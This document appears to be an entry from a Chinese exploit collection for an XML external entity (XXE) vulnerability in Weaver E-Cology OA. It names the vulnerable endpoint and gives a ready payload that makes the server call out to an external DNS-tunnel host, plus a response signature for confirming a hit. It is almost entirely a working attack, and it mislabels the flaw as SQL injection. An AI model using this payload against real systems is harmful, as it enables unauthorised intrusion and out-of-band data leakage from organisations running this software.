# 泛微E-CologyXml外部实体注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **请求**：`POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1`

**Payload**
```
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY % d SYSTEM "http://wutvavcfzj.dnstunnel.run">
%d;
]>
<a>&xxe;</a>
```
- **响应特征**：-1